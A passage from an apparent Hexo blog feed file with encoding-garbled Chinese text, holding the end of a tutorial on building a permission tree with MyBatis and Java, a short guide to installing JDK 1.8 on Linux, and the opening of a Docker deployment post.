punctuation">&lt;/</span>resultMap</span><span class="token punctuation">></span></span>    <span class="token comment">&lt;!--=End findPerms æŸ¥æ‰¾æƒé™æ ‘åˆ—è¡¨--></span>    <span class="token comment">&lt;!-- pID å¯¹åº” PermissionVO ä¸­ pID--></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>sql</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>PermColumn<span class="token punctuation">"</span></span> <span class="token punctuation">></span></span>        id, name,pid,istype, code,page    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>sql</span><span class="token punctuation">></span></span>    <span class="token comment">&lt;!--=Start findPerms æŸ¥æ‰¾æƒé™æ ‘åˆ—è¡¨--></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>select</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>findPerms<span class="token punctuation">"</span></span>  <span class="token attr-name">resultMap</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>findPermissionMap<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        SELECT          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>include</span> <span class="token attr-name">refid</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>PermColumn<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>        FROM          permission        WHERE          pid = 0 OR  pid is NULL    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>select</span><span class="token punctuation">></span></span>    <span class="token comment">&lt;!--=End findPerms æŸ¥æ‰¾æƒé™æ ‘åˆ—è¡¨--></span>    <span class="token comment">&lt;!--=Start findChildPerm æŸ¥æ‰¾æ‰€æœ‰å­èŠ‚ç‚¹æƒé™--></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>select</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>findChildPerm<span class="token punctuation">"</span></span> <span class="token attr-name">resultMap</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>findPermissionMap<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        select        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>include</span> <span class="token attr-name">refid</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>PermColumn<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>        from permission        where pid = #&#123;pid&#125;    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>select</span><span class="token punctuation">></span></span>    <span class="token comment">&lt;!--=End findChildPerm æŸ¥æ‰¾æ‰€æœ‰å­èŠ‚ç‚¹æƒé™--></span></code></pre>              </div>            </details></div><h2 id="serviceå±‚è°ƒç”¨">serviceå±‚è°ƒç”¨</h2><div class="story post-story"><pre class="language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Override</span><span class="token keyword">public</span> <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">PermissionVO</span><span class="token punctuation">></span></span> <span class="token function">findPerms</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> permissionsMapper<span class="token punctuation">.</span><span class="token function">findPerms</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre></div><h2 id="controller">controller</h2><div class="story post-story"><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">PermissionVO</span><span class="token punctuation">></span></span> pvos <span class="token operator">=</span> authService<span class="token punctuation">.</span><span class="token function">findPerms</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h1>æ³•äºŒ:é€šè¿‡é€’å½’å®ç°</h1></div><h2 id="mybatis-xmlé…ç½®">mybatis.xmlé…ç½®</h2><div class="story post-story"><details green><summary> code </summary>              <div class='content'>              <pre class="language-xml" data-language="xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>resultMap</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>BaseResultMap<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>com.sizaif.emsdemo.dto.PermissionVO<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>id</span> <span class="token attr-name">property</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>id<span class="token punctuation">"</span></span> <span class="token attr-name">column</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>id<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>result</span> <span class="token attr-name">property</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>name<span class="token punctuation">"</span></span> <span class="token attr-name">column</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>name<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>result</span> <span class="token attr-name">property</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>pid<span class="token punctuation">"</span></span> <span class="token attr-name">column</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>pid<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>result</span> <span class="token attr-name">property</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>istype<span class="token punctuation">"</span></span> <span class="token attr-name">column</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>istype<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>result</span> <span class="token attr-name">property</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>code<span class="token punctuation">"</span></span> <span class="token attr-name">column</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>code<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>result</span> <span class="token attr-name">property</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>page<span class="token punctuation">"</span></span> <span class="token attr-name">column</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>page<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>resultMap</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>select</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>getChildren<span class="token punctuation">"</span></span> <span class="token attr-name">resultMap</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>BaseResultMap<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    select id, pid, name, istype, code,page    from permission where pid = #&#123;id&#125;<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>select</span><span class="token punctuation">></span></span></code></pre>              </div>            </details></div><h2 id="service">service</h2><div class="story post-story"><pre class="language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Override</span><span class="token keyword">public</span> <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">PermissionVO</span><span class="token punctuation">></span></span> <span class="token function">getChildPerms</span><span class="token punctuation">(</span><span class="token class-name">Integer</span> id<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> permissionsMapper<span class="token punctuation">.</span><span class="token function">getChildren</span><span class="token punctuation">(</span>id<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre></div><h2 id="controller-2">controller</h2><div class="story post-story"><details green><summary> code </summary>              <div class='content'>              <pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token class-name">PermissionVO</span> <span class="token function">initPermission1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token class-name">PermissionVO</span> permissionvo<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">PermissionVO</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">try</span><span class="token punctuation">&#123;</span>        permissionvo<span class="token punctuation">.</span><span class="token function">setId</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//è¿™ä¸ªåœ°æ–¹åº”è¯¥é€šè¿‡æ•°æ®åº“æŸ¥è¯¢å‡ºæ ¹èŠ‚ç‚¹ï¼Œå› ä¸ºæ ¹èŠ‚ç‚¹idåœ¨æ•°æ®åº“æ˜¯0ï¼Œ</span>        <span class="token function">queryChildPermissions</span><span class="token punctuation">(</span>permissionvo<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//é€’å½’å¾—åˆ°å…¨éƒ¨èŠ‚ç‚¹</span>    <span class="token punctuation">&#125;</span><span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">throw</span>  e<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> permissionvo<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">private</span> <span class="token keyword">void</span> queryChildPermissions <span class="token punctuation">(</span><span class="token class-name">PermissionVO</span> permissionvo<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">PermissionVO</span><span class="token punctuation">></span></span> children<span class="token operator">=</span>  authService<span class="token punctuation">.</span><span class="token function">getChildPerms</span><span class="token punctuation">(</span>permissionvo<span class="token punctuation">.</span><span class="token function">getId</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//é€šè¿‡idæŸ¥è¯¢å­é›†åˆ</span>    permissionvo<span class="token punctuation">.</span><span class="token function">setChildren</span><span class="token punctuation">(</span>children<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//å°†æŸ¥è¯¢å‡ºæ¥çš„å­èŠ‚ç‚¹é›†åˆæ”¾å…¥åˆ°permissionvoé›†åˆä¸­</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token class-name">PermissionVO</span> innerChildren<span class="token operator">:</span>children<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token comment">//éå†å‡ºå­é›†åˆçš„å­é›†åˆ</span>        <span class="token function">queryChildPermissions</span><span class="token punctuation">(</span>innerChildren<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment">//æ”¾å…¥åˆ°å­èŠ‚ç‚¹çš„å­é›†åˆä¸­</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre>              </div>            </details><h1>æ³•ä¸‰: ä¸€æ¬¡æŸ¥å‡ºå…¨éƒ¨è®°å½•ï¼Œé€šè¿‡åµŒå¥—å¾ªç¯éå†ç»“æœ</h1></div><h2 id="xml">xml</h2><div class="story post-story"><details green><summary> code </summary>              <div class='content'>              <pre class="language-xml" data-language="xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>resultMap</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>BaseResultMap<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>com.sizaif.emsdemo.dto.PermissionVO<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>id</span> <span class="token attr-name">property</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>id<span class="token punctuation">"</span></span> <span class="token attr-name">column</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>id<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>result</span> <span class="token attr-name">property</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>name<span class="token punctuation">"</span></span> <span class="token attr-name">column</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>name<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>result</span> <span class="token attr-name">property</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>pid<span class="token punctuation">"</span></span> <span class="token attr-name">column</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>pid<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>result</span> <span class="token attr-name">property</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>istype<span class="token punctuation">"</span></span> <span class="token attr-name">column</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>istype<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>result</span> <span class="token attr-name">property</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>code<span class="token punctuation">"</span></span> <span class="token attr-name">column</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>code<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>result</span> <span class="token attr-name">property</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>page<span class="token punctuation">"</span></span> <span class="token attr-name">column</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>page<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>resultMap</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>select</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>selectAll<span class="token punctuation">"</span></span> <span class="token attr-name">resultMap</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>BaseResultMap<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    select id, pid, name, istype,code,page    from permission<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>select</span><span class="token punctuation">></span></span></code></pre>              </div>            </details></div><h2 id="service-2">service:</h2><div class="story post-story"><pre class="language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Override</span><span class="token keyword">public</span> <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">PermissionVO</span><span class="token punctuation">></span></span> <span class="token function">selectAll</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> permissionsMapper<span class="token punctuation">.</span><span class="token function">selectAll</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre></div><h2 id="controller-3">controller:</h2><div class="story post-story"><details green><summary> code </summary>              <div class='content'>              <pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token class-name">PermissionVO</span> <span class="token function">initPermissionVO</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token class-name">PermissionVO</span> permissionvo <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PermissionVO</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">PermissionVO</span><span class="token punctuation">></span></span> lists<span class="token operator">=</span> authService<span class="token punctuation">.</span><span class="token function">selectAll</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//æŸ¥è¯¢æ‰€æœ‰èŠ‚ç‚¹</span>    <span class="token keyword">try</span><span class="token punctuation">&#123;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token class-name">PermissionVO</span> ps<span class="token operator">:</span>lists<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token comment">//éå†èŠ‚ç‚¹</span>            <span class="token class-name">PermissionVO</span> child <span class="token operator">=</span> ps<span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span> ps<span class="token punctuation">.</span><span class="token function">getPid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">||</span> ps<span class="token punctuation">.</span><span class="token function">getPid</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token comment">//è·å–æ ¹èŠ‚ç‚¹,Integerç±»å‹æ˜¯åŒ…è£…ç±»ï¼Œåˆ¤æ–­å¯¹è±¡å¼•ç”¨</span>                permissionvo <span class="token operator">=</span> ps<span class="token punctuation">;</span><span class="token comment">//æ ¹èŠ‚ç‚¹</span>            <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>                <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">PermissionVO</span> innerpermissionvo<span class="token operator">:</span>lists<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                    <span class="token keyword">if</span><span class="token punctuation">(</span>child<span class="token punctuation">.</span><span class="token function">getPid</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> innerpermissionvo<span class="token punctuation">.</span><span class="token function">getId</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token comment">//å¦‚æœèŠ‚ç‚¹çš„çš„pidå’Œé›†åˆä¸­æŸä¸ªèŠ‚ç‚¹çš„idä¸€è‡´</span>                        <span class="token class-name">PermissionVO</span> parent<span class="token operator">=</span>innerpermissionvo<span class="token punctuation">;</span><span class="token comment">//å°†è¿™ä¸ªèŠ‚ç‚¹å‘½åä¸ºçˆ¶èŠ‚ç‚¹</span>                        parent<span class="token punctuation">.</span><span class="token function">getChildren</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>child<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//ç„¶åæŠŠchildæ”¾å…¥åˆ°å®ƒçš„çˆ¶äº²é›†åˆä¸­</span>                        <span class="token keyword">break</span><span class="token punctuation">;</span>                    <span class="token punctuation">&#125;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">throw</span>  e<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> permissionvo<span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre>              </div>            </details><h1>æ³•å››:ä¸€æ¬¡æŸ¥å‡ºæ‰€æœ‰æ•°æ®,é€šè¿‡Mapé›†åˆå®ç°æ ‘ç»“æ„</h1></div><h2 id="xml-ä¸service-ä¸æ³•ä¸‰ä¸€è‡´">xml ä¸service ä¸æ³•ä¸‰ä¸€è‡´,</h2><div class="story post-story"></div><h2 id="controller-4">controller:</h2><div class="story post-story"><details green><summary> code </summary>              <div class='content'>              <pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token class-name">PermissionVO</span> <span class="token function">initPermission</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token class-name">PermissionVO</span> permissionvo<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">PermissionVO</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">PermissionVO</span><span class="token punctuation">></span></span> lists <span class="token operator">=</span> authService<span class="token punctuation">.</span><span class="token function">selectAll</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//æŸ¥è¯¢æ‰€æœ‰èŠ‚ç‚¹</span>    <span class="token class-name">Map</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">,</span><span class="token class-name">PermissionVO</span><span class="token punctuation">></span></span> map <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">,</span><span class="token class-name">PermissionVO</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//å°†æ‰€æœ‰èŠ‚ç‚¹å­˜å…¥åˆ°mapé›†åˆ</span>    <span class="token keyword">try</span><span class="token punctuation">&#123;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token class-name">PermissionVO</span> ps<span class="token operator">:</span>lists<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            map<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>ps<span class="token punctuation">.</span><span class="token function">getId</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>ps<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//å°†æ‰€æœ‰idåšä¸ºkeyï¼ŒPermissionvoå¯¹è±¡åšå€¼ï¼Œå­˜å…¥åˆ°mapé›†åˆ</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token class-name">PermissionVO</span> ps<span class="token operator">:</span>lists<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token comment">//éå†æ‰€æœ‰èŠ‚ç‚¹</span>            <span class="token class-name">PermissionVO</span> child <span class="token operator">=</span> ps<span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>child<span class="token punctuation">.</span><span class="token function">getPid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">||</span>child<span class="token punctuation">.</span><span class="token function">getPid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                permissionvo <span class="token operator">=</span> ps<span class="token punctuation">;</span><span class="token comment">//å–å‡ºæ ¹èŠ‚ç‚¹</span>            <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>                <span class="token class-name">PermissionVO</span> parent <span class="token operator">=</span> map<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>child<span class="token punctuation">.</span><span class="token function">getPid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//é€šè¿‡å­èŠ‚ç‚¹çš„pidè·å–çˆ¶èŠ‚ç‚¹</span>                parent<span class="token punctuation">.</span><span class="token function">getChildren</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>child<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//å°†å­èŠ‚ç‚¹æ”¾å…¥çˆ¶èŠ‚ç‚¹ä¸­</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> permissionvo<span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre>              </div>            </details><p><strong>å››ç§æ–¹å¼æŸ¥å‡ºæ¥çš„ç»“æœæ˜¯ä¸€æ ·çš„,ä½†æ•ˆç‡æ–¹é¢æ³•å››æœ€å¿«</strong></p></div>]]></content>
      
      
      <categories>
          
          <category> æŠ€æœ¯å‘ </category>
          
          <category> Mybatis </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> Mybatis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linuxå®‰è£…java1.8 Jdkå¹¶é…ç½®ç¯å¢ƒå˜é‡</title>
      <link href="/posts/f03f62f2/"/>
      <url>/posts/f03f62f2/</url>
      
        <content type="html"><![CDATA[<blockquote><p>@auther by sizaif</p></blockquote><p>@<a href="%E7%9B%AE%E5%BD%95">TOC</a></p><h1>ä¸‹è½½jdk</h1><p>ç™¾åº¦ç½‘ç›˜é“¾æ¥:<a href="https://pan.baidu.com/s/1o0LlfAInZug4apeL3lCyYw">æå–ç : krfa</a></p><h1>ä½¿ç”¨fileZillaå°†jdkä¼ è¾“åˆ°linuxä¸Š</h1><p><img src="https://img-blog.csdnimg.cn/20200513211713523.png" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/20200513211713523.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h1>å®‰è£…</h1><pre class="language-shell" data-language="shell"><code class="language-shell"><span class="token function">rpm</span> -ivh jdk-8u251-linux-x64.rpm</code></pre><h1>é…ç½®ç¯å¢ƒå˜é‡</h1><pre class="language-shell" data-language="shell"><code class="language-shell"><span class="token function">vim</span> /etc/profile</code></pre><p><img src="https://img-blog.csdnimg.cn/20200513212331756.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NpemFpZg==,size_16,color_FFFFFF,t_70" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/20200513212331756.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NpemFpZg==,size_16,color_FFFFFF,t_70" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><pre class="language-shell" data-language="shell"><code class="language-shell"><span class="token builtin class-name">export</span> <span class="token assign-left variable">JAVA_HOME</span><span class="token operator">=</span>/usr/java/jdk1.8.0_251-amd64<span class="token builtin class-name">export</span> <span class="token assign-left variable">CLASSPATH</span><span class="token operator">=</span>.:<span class="token variable">$JAVA_HOME</span>/jre/lib/rt.jar:<span class="token variable">$JAVA_HOME</span>/lib/dt.jar:<span class="token variable">$JAVA_HOME</span>/lib/tools.jar<span class="token builtin class-name">export</span> <span class="token assign-left variable"><span class="token environment constant">PATH</span></span><span class="token operator">=</span><span class="token variable">$JAVA_HOME</span>/bin:<span class="token environment constant">$PATH</span></code></pre><h1>æ›´æ–°ç¯å¢ƒå˜é‡</h1><pre class="language-shell" data-language="shell"><code class="language-shell"><span class="token builtin class-name">source</span> /etc/profile</code></pre><h1>éªŒè¯:</h1><pre class="language-shell" data-language="shell"><code class="language-shell">java -version </code></pre><p><img src="https://img-blog.csdnimg.cn/2020051321255422.png" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/2020051321255422.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>]]></content>
      
      
      <categories>
          
          <category> æŠ€æœ¯å‘ </category>
          
          <category> Java </category>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> Jdk </tag>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ä½¿ç”¨Dockeréƒ¨ç½²SpringBooté¡¹ç›®å…¨æµç¨‹è®°å½•,è¶…è¯¦ç»†!</title>
      <link href="/posts/dfba8e73/"/>
      <url>/posts/dfba8e73/</url>
      
